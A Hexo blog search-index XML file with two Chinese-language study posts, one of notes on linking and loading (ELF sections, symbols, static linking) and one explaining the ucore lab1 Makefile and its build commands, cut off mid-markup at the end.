<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>《程序员的自我修养-链接装载与库》</title>
    <link href="/2022-05/Now-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/"/>
    <url>/2022-05/Now-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="1-2"><a href="#1-2" class="headerlink" title="1-2"></a>1-2</h2><p>没啥特别的</p><h2 id="3-ELF"><a href="#3-ELF" class="headerlink" title="3 ELF"></a>3 ELF</h2><blockquote><p>COFF 是由 Unix System V Release 3 首先提出并且使用的格式规范，后来微软公司基 于 COFF 格式，制定了 PE 格式标准，并将其用于当时的 Windows NT 系统。 System V Release 4 在 COFF 的基础上引入了 ELF 格式，目前流行的 Linux 系统也以 ELF 作 为基本可执行文件格式。这也就是为什么目前 PE 和 ELF 如此相似的主要原因</p></blockquote><p>段 section：</p><ul><li>另外值得一提的是，有时候编译器会把宁符串常量放到 “.data” 段，而不会单独放在”.rodata” 段。</li><li>” .note.GNU-stack” 段虽然有 “ CONTENTS”, 但它的长度为 0, 这是个很古怪的段</li><li>应用程序也可以使用一些非系统保留的名字作为段名 。 比如我们可以在 ELF 文件中插入一个 “music” 的 段，里面存放了一首 MP3 音乐，节 ELF 文件运行起来以后可以读取这个段播放这首 MP3. 但是应用程序自定义的段名不能使用“.”作为前缀，否则容易跟系统保留段名冲突。</li><li>比如一个 ELF 文件中可能有两个或两个以上叫做 “.text” 的段</li><li>自定义段<ul><li><code>_attribute_( (section( &quot;FOO&quot;))) int global= 42;</code> </li></ul></li></ul><p>ELF:</p><ul><li>ELF 段表的这个数组的第一个元素是无效的段描述符，它的类型为 ‘,NULL”, 除此之外每个段 描述符都对应一个段</li><li>主要决定段的属性的是段的类型 (<strong>sb_type</strong>) 和段的标志位 (<strong>sh_flags</strong>) P100</li><li>对于变量和函数来说，符号值就是它们的地址</li><li>P108 符号表详细介绍<ul><li>链接器特殊符号! 用extern声明. 在ucore中也见过.</li></ul></li></ul><p>编译器行为:</p><ul><li>符号修饰与函数签名, 加不加下划线的区别.<ul><li>P111 C++函数签名.</li><li>binutils中<code>c++filt</code>命令解析函数签名, 真行</li><li>extern “C”的作用!</li><li>确实是涨知识.</li></ul></li><li>强弱引用:<ul><li>通过使用 <code>&quot;_attribute_((weakref))&quot; </code>这个扩展关键字来声明对一 个外部函数的引用为弱引用</li><li>这种弱符号和弱引用对于库来说十分有用，比如库中定义的弱符号可以被用户定义的强 符号所覆盖，从而使得程序可以使用自定义版本的库函数；或者程序可以对某些扩展功能模块的引用定义为弱引用，当我们将扩展模块与程序链接在一起时，功能模块就可以正常使用； 如果我们去掉了某些功能模块，那么程序也可以正常链接，只是缺少了相应的功能，这使得程序的功能更加容易裁剪和组合。</li></ul></li><li><strong>DWARF</strong> ( Debug With Arbitrary Record Format)</li></ul><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>对于多个输入目标文件，链接器将相似段合并</p><p>整个链接过程分两步:</p><ul><li>扫描所有的输入目标文件，并且获得它们的各个段的长度、 属性和位置，并且将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统— 放到一个全局符号表。</li><li>使用上面第一步中收集到的所有信息，读取输入文件中段的数据、重定位信息，井且进行符号解析与重定位、调整代码中的地址等</li></ul><p>也就是:</p><ul><li>链接器按照前面介绍的空间分配方法进行分配，这时候输入文 件中的各个段在链接后的<strong>虚拟地址</strong>就已经确定了</li><li>当前面一步完成之后，链接器开始计算各个符号的虚拟地址</li></ul><p>我现在的知识似乎还停留在静态链接的框架里面. 还是继续看吧, 书里也有动态链接的细节. 在CSAPP里也没提及.</p><p><strong>4.3 COMMON 块</strong> </p><ul><li>COMMON 类型的链接规则是针对符号都是弱符号的情况， 如果其中有一个符号 为强符号，那么最终输出结果中的符号所占空间与强符号相同, 如果有弱符号的大小大于强符号的大小, 那么连接器会给出警告.</li><li>直接导致需要COMMON 机制的原因是编译器和链接器允许不同类型的弱符号存在，但最本质的原因还是 链接器不支持符号类型，即链接器无法判断各个符号的类型是否一致。</li><li>编译器在链接前无法为弱符号在BSS 段分配空间，因为所须要空间的大小未知。如果只使用<code>gcc -c</code>的话会发现未初始化的全局变量没有出现在bss段. 但是链接器在链接过程中可以确定弱符号的大小.</li><li><code>-fno-common</code> or <code>__attribute__((nocommon));</code> 禁用common处理.</li><li>一旦一个未初始化的全局变蜇不是以 COMMON 块的形式存在，那么它就相当于一个强符号，如果其他目标文件中还有同一个变量的强符号定义，链接时就会发生符号重复定义错误。</li></ul><p><strong>4.4 C+＋相关问题</strong> P135</p><p><strong>4.4.2 全局构造与析构</strong> </p><ul><li>Linux 系统下一般程序的入口是 “_start”. 这个函数是 Linux 系统库 (Glibc) 的一部分</li><li>利用<code>.init和.fini段</code>的特性， C++的全局构造和析构函数就由此实现</li></ul><p><strong>4.4.3 C+＋与 ABI</strong>  </p><ul><li>其中我们把符号修饰 标准、变量内存布局、函数调用方式等这些跟可执行代码二进制兼容性相关的内容称为 ABI (Application Binary Interface).</li><li>影响ABI的因素. P139</li></ul><p>静态库链接:</p><ul><li>VIsual C+＋也提供了与 Lmux下的ar类似的工具，叫lib.exe，这个程序可以用来创建,提取,列举lib文件中的内容。</li><li>P143 链接的一个示例过程</li></ul><p>4.6.2 最“小＂的程序</p><blockquote><p>做着做着就做到思维导图上去了…</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ucore makefile分析</title>
    <link href="/2022-04/Learning-ucore-makefile/"/>
    <url>/2022-04/Learning-ucore-makefile/</url>
    
    <content type="html"><![CDATA[<p>贴个出处: -&gt; <a href="https://www.jianshu.com/p/2f95d38afa1d">link</a> </p><p>不妨对整个lab1所提供的Makefile进行解释如下：</p><p>不妨首先考虑Makefile中生成ucore.img相关的主要代码(暂时不考虑细节问题)来描述生成出ucore.img的每一个具体步骤:</p><ul><li><p>生成kernel:</p><ul><li>首先是<code>$(call add_files_cc,$(call listf_cc,$(LIBDIR)),libs,)</code>这一段代码，含义是寻找libs目录下的所有具有.c, .s后缀的文件，并生成相应的.o文件，放置在obj/libs/文件夹下，具体生成的文件是printfmt.o, string.o文件，与此同时，该文件夹下还生成了.d文件，这是Makefile自动生成的依赖文件列表所存放的位置，比如打开string.d文件可以发现，string.o文件的生成依赖于string.c, string.h, x86.h, defs.h四个文件，这与我们对于代码的观察是一致的；这部分编译所使用的编译选项保存在CFLAGS变量下，关于具体每一个使用到的gcc编译选项的含义，将在下文具体分析Makefile中定义CFLAGS变量的部分进行详细描述；</li><li><code>$(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS)</code>这一段代码将用于生成kernel的所有子目录下包含的CTYPE文件（.s, .c文件）所对应的.o文件以及.d文件，这段代码与上述生成obj/libs/*.o文件的代码类似，区别仅在于其还新指定了若干gcc编译选项，存放在KCFLAGS变量中，具体为制定了若干存放在KINCLUDE变量下的头文件；具体而言，该命令最终生成的文件为obj/kern下子目录里的以stdio, readline, panic, kdebug, kmonitor, clock, console, picirq, intr, trap, vector, trapentry, pmm为前缀的.d, .o文件；</li><li>接下来<code>$(kernel): tools/kernel.ld</code>表示/bin/kernel文件依赖于tools/kernel.ld文件，并且没有指定生成规则，也就是说如果没有预先准备好kernel.ld，就会在make的时候产生错误；之后的<code>$(kernel): $(KOBJS)</code>表示kernel文件的生成还依赖于上述生成的obj/libs, obj/kernels下的.o文件，并且生成规则为使用ld链接器将这些.o文件连接成kernel文件，其中ld的-T表示指定使用kernel.ld来替代默认的链接器脚本；关于LDFLAGS中的选项含义，将在下文中描述LDFLAGS变量定义的时候进行描述；之后还使用objdump反汇编出kernel的汇编代码，-S表示将源代码与汇编代码混合展示出来，这部分代码最终保存在kernel.asm文件中；-t表示打印出文件的符号表表项，然后通过管道将带有符号表的反汇编结果作为sed命令的标准输入进行处理，最终将符号表信息保存到kernel.sym文件中；</li></ul></li><li><p>生成bootblock文件：</p><ul><li><p>首先是</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,<span class="hljs-variable">$(bootfiles)</span>,$(<span class="hljs-built_in">call</span> cc_compile,<span class="hljs-variable">$(f)</span>,<span class="hljs-variable">$(CC)</span>,<span class="hljs-variable">$(CFLAGS)</span> -Os -nostdinc)</span><br></code></pre></div></td></tr></table></figure><p>这一段代码，表示将boot/文件夹下的bootasm.S, bootmain.c两个文件编译成相应的.o文件，并且生成依赖文件.d；其中涉及到的两个gcc编译选项含义如下所示：</p><ul><li>-nostdinc: 不搜索默认路径头文件；</li><li>-0s: 针对生成代码的大小进行优化，这是因为bootloader的总大小被限制为不大于512-2=510字节；</li></ul></li><li><p>接下来由代码</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(bootblock)</span>: <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,<span class="hljs-variable">$(bootfiles)</span>)</span> | <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,sign)</span><br></code></pre></div></td></tr></table></figure><p>可知，bootblock依赖于bootasm.o, bootmain.o文件与sign文件，其中两个.o文件由以下规则生成：</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(V)</span><span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,bootblock)</span><br></code></pre></div></td></tr></table></figure><p>: 使用ld链接器将依赖的.o文件链接成bootblock.o文件，该文件中除了$(LDFLAGS)之外的其他选项含义如下：</p><ul><li>-N：将代码段和数据段设置为可读可写；</li><li>-e：设置入口；</li><li>-Ttext：设置起始地址为0X7C00；</li></ul></li><li><p><code>@$(OBJDUMP) -S $(call objfile,bootblock) &gt; $(call asmfile,bootblock)</code>: 使用objdump将编译结果反汇编出来，保存在bootclock.asm中，-S表示将源代码与汇编代码混合表示；</p></li><li><p><code>@$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock)</code>: 使用objcopy将bootblock.o二进制拷贝到bootblock.out，其中：</p><ul><li>-S：表示移除符号和重定位信息；</li><li>-O：表示指定输出格式；</li></ul></li><li><p><code>@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</code>: 使用sign程序, 利用bootblock.out生成bootblock;</p></li><li><p><code>$(call add_files_host,tools/sign.c,sign,sign</code>: 利用tools/sing.c生成sign.o, <code>$(call create_target_host,sign,sign)</code>则利用sign.o生成sign，至此bootblock所依赖的文件均生成完毕；</p></li></ul></li><li><p>最后一个部分是利用dd命令使用bootblock, kernel文件来生成ucore.img文件：</p><ul><li><code>$(V)dd if=/dev/zero of=$@ count=10000</code> 命令表示从/dev/zero文件中获取10000个block，每一个block为512字节，并且均为空字符，并且输出到目标文件ucore.img中；</li><li><code>$(V)dd if=$(bootblock) of=$@ conv=notrunc</code> 命令表示从bootblock文件中获取数据，并且输出到目标文件ucore.img中，-notruct选项表示不要对数据进行删减；</li><li><code>$(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc</code> 命令表示从kernel文件中获取数据，并且输出到目标文件ucore.img中, 并且seek = 1表示跳过第一个block，输出到第二个块；</li></ul></li><li><p>至此，关于生成ucore.img文件的主要的Makefile命令分析完成；</p></li><li><p>接下来将就整个Makefile文件中的其他每个部分进行分析:首先在Makefile的最开始是对各种常量的初始化：</p></li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go">PROJ    := challenge<br>EMPTY   :=<br>SPACE   := $(EMPTY) $(EMPTY)<br>SLASH   := /<br><br>V       :=<br></code></pre></div></td></tr></table></figure><ul><li>接下来部分则用于推断环境中调用所安装的gcc应当使用的命令：<br> 在本部分，如果为定义GCCPREFIX变量，则利用了linux bash中的技巧来推断所使用的gcc命令是什么, 在本部分首先猜测gcc命令的前缀是i386-elf-，因此执行i386-elf-objdump -i命令，2&gt;&amp;1表示将错误输出一起输出到标准输出里，然后通过管道的方式传递给下一条bash命令grep ‘^elf32-i386$$’ &gt;/dev/null 2&gt;&1;，&gt;/dev/null这部分表示将标准输出输出到一个空设备里，而输入上一条命令发送给grep的标准输出（作为grep的输入）中可以匹配到’^elf32-i386$$’的话，则说明i386-elf-objdump这一命令是存在的，那么条件满足，由echo输出’i386-elf-‘，由于是在$()里的bash命令，这个输出会作为值被赋给GCCPREFIX变量；如果i386-elf-objdump命令不存在，则猜测使用的gcc命令不包含其他前缀，则继续按照上述方法，测试objdump这条命令是否存在，如果存在则GCCPREFIX为空串，否则之间报错，要求显示地提供gcc的前缀作为GCCPREFIX变量的数值（可以在环境变量中指定）；</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ifndef GCCPREFIX<br>GCCPREFIX := $(shell <span class="hljs-keyword">if</span> i386-elf-objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;^elf32-i386$$&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-&#x27;</span>; \<br>    <span class="hljs-keyword">elif</span> objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;elf32-i386&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span>; \<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find an i386-elf version of GCC/binutils.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory with i386-elf-gcc in your PATH?&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** If your i386-elf toolchain is installed with a command&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** prefix other than &#x27;i386-elf-&#x27;, set your GCCPREFIX&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** environment variable to that prefix and run &#x27;make&#x27; again.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** To turn off this error, run &#x27;gmake GCCPREFIX= ...&#x27;.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>接下来部分与上述方法一致，利用bash命令来推断qemu的命令，因此具体细节不再赘述；</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># try to infer the correct QEMU</span><br>ifndef QEMU<br>QEMU := $(shell <span class="hljs-keyword">if</span> <span class="hljs-built_in">which</span> qemu-system-i386 &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu-system-i386&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> i386-elf-qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">else</span> \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find a working QEMU executable.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory containing the qemu binary in your PATH&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>接下来的部分定义了各种编译命令以及编译选项，其中-fno-stack-protector编译选项的确定也使用了与上文确定GCCPREFIX相似的技巧，巧妙地利用了linux bash中 &amp;&amp; 连接起来的两条指令，如果第一条指令出错，则第二条指令不会执行的特点，来确认当前的gcc是否允许使用 -fno-stack-protector这一编译选项；</li><li>该段Makefile代码中所设计的所有gcc编译选项和链接器ld选项的作用分别如下：<ul><li>-g：在编译中加入调试信息，便于之后使用gdb进行调试；</li><li>-Wall：使能所有编译警告，便于发现潜在的错误；</li><li>-O2: 开启O2编译优化；</li><li>-fno-builtin: 不承认所有不是以<strong>builtin</strong>为开头的内建函数；</li><li>-ggdb 产生gdb所需要的调试信息（与-g的区别是ggdb的调试信息是专门为gdb而生成的）；</li><li>-m32: 32位模式；</li><li>-gstabs：以stabs格式输出调试信息，不包括gdb拓展；</li><li>-nostdinc: 不搜索默认路径头文件；</li><li>-fno-stack-protector: 禁用堆栈保护;</li><li>-nostdlib: 该链接器选项表示不链接任何系统标准启动文件和标准库文件，这是因为编译操作系统内核和bootloader是不需要这些启动文件和库就应该能够执行的；</li></ul></li><li>其他涉及到的bash命令选项为：<ul><li>mkdir -p: 允许创建嵌套子目录；</li><li>touch -c: 不创建已经存在的文件；</li><li>rm -f: 无视任何确认提示；</li></ul></li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># eliminate default suffix rules</span><br><span class="hljs-section">.SUFFIXES: .c .S .h</span><br><br><span class="hljs-comment"># delete target files if there is an error (or make is interrupted)</span><br><span class="hljs-section">.DELETE_ON_ERROR:</span><br><br><span class="hljs-comment"># define compiler and flags</span><br><span class="hljs-keyword">ifndef</span>  USELLVM<br>HOSTCC      := gcc<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := <span class="hljs-variable">$(GCCPREFIX)</span>gcc<br>CFLAGS  := -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">else</span><br>HOSTCC      := clang<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := clang<br>CFLAGS  := -fno-builtin -Wall -g -m32 -mno-sse -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">endif</span><br><br>CTYPE   := c S<br><br>LD      := <span class="hljs-variable">$(GCCPREFIX)</span>ld<br>LDFLAGS := -m <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(LD)</span> -V | grep elf_i386 2&gt;/dev/null)</span><br>LDFLAGS += -nostdlib<br><br>OBJCOPY := <span class="hljs-variable">$(GCCPREFIX)</span>objcopy<br>OBJDUMP := <span class="hljs-variable">$(GCCPREFIX)</span>objdump<br><br>COPY    := cp<br>MKDIR   := mkdir -p<br>MV      := mv<br>RM      := rm -f<br>AWK     := awk<br>SED     := sed<br>SH      := sh<br>TR      := tr<br>TOUCH   := touch -c<br><br>OBJDIR  := obj<br>BINDIR  := bin<br><br>ALLOBJS :=<br>ALLDEPS :=<br>TARGETS :=<br></code></pre></div></td></tr></table></figure><ul><li>接下来的部分引用了tools/function.mk文件，因此不仿分析该文件的内容如下：</li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># list all files in some directories: (#directories, #types)</span><br>listf = <span class="hljs-variable">$(<span class="hljs-built_in">filter</span> $(<span class="hljs-built_in">if</span> $(2)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> %.,$(2)</span>),%),\<br>          <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> $(<span class="hljs-built_in">addsuffix</span> <span class="hljs-variable">$(SLASH)</span>*,$(1)</span>))<br></code></pre></div></td></tr></table></figure><p>上述定义了一个获取某一个目录下的所有某类型文件的表达式，该表达式可以使用call函数调用来使用，其中<code>$(if $(2),$(addprefix %.,$(2)),%)</code>部分是用于构造一个<code>%.</code>某后缀形式的pattern，<code>$(wildcard $(addsuffix $(SLASH)*,$(1))</code>部分则是被是用来获取当前目录下的而所有文件，并且使用filter函数过滤出这所有文件中具有.$(2) (即call传入的第二个参数)后缀的文件；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .o obj files: (#files[, packet])</span><br>toobj = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>$(<span class="hljs-built_in">if</span> $(2)</span>,$(2)<span class="hljs-variable">$(SLASH)</span>),\<br>        <span class="hljs-variable">$(<span class="hljs-built_in">addsuffix</span> .o,$(<span class="hljs-built_in">basename</span> $(1)</span>))<br></code></pre></div></td></tr></table></figure><p>该表达式表示将传入的文件名列表中的所有后缀修改为.o，并且将其添加上这些.o文件的目录，获取到这些.o文件最终应该存放的位置；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .d dependency files: (#files[, packet])</span><br>todep = <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> %.o,%.d,$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(2))<br></code></pre></div></td></tr></table></figure><p>将所有.o文件的后缀名修改为.d;</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">totarget = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span>,$(1)</span>)<br></code></pre></div></td></tr></table></figure><p>获取由第一个参数传入的binary文件最终应当存放的位置；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># change $(name) to $(OBJPREFIX)$(name): (#names)</span><br>packetname = <span class="hljs-variable">$(<span class="hljs-built_in">if</span> $(1)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJPREFIX)</span>,$(1)</span>),<span class="hljs-variable">$(OBJPREFIX)</span><br></code></pre></div></td></tr></table></figure><p>给第一个参数传入的所有文件名加上$(OBJPREFIX)前缀；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># cc compile template, generate rule for dep, obj: (file, cc[, flags, dir])</span><br><span class="hljs-keyword">define</span> cc_template<br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>ende<br></code></pre></div></td></tr></table></figure><p>这部分使用define多行定义了一个编译的模板(对单个文件进行编译成object文件)，其中若干处$$表示原本的字符$，这是因为后文中将对这个部分执行eval，而$$&lt;即原本的$&lt;表示了依赖目标的值，$@表示了目标的值, 在本部分中，将最终生成出目标文件的依赖文件，以及定义了生成目标文件的规则;</p><p><strong>更具体一点，该模板的前半部分是用于生成Makefile .d依赖文件（利用gcc的-MM选项），后半部分则是使用gcc编译出.o文件, 并且将所有.o文件加入到ALLOBJS变量中；</strong> </p><p><strong>关于上述代码中的$(V)的使用</strong>，发现原本<code>V</code>变量定义的是@, 也就是不在shell中输出的符号, 如果在make命令行中overide the definition of V, 也就是使用<code>V=</code>赋值为空, 那么<code>$(V)</code>后面的命令就会被输出.</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-keyword">define</span> do_cc_compile<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span 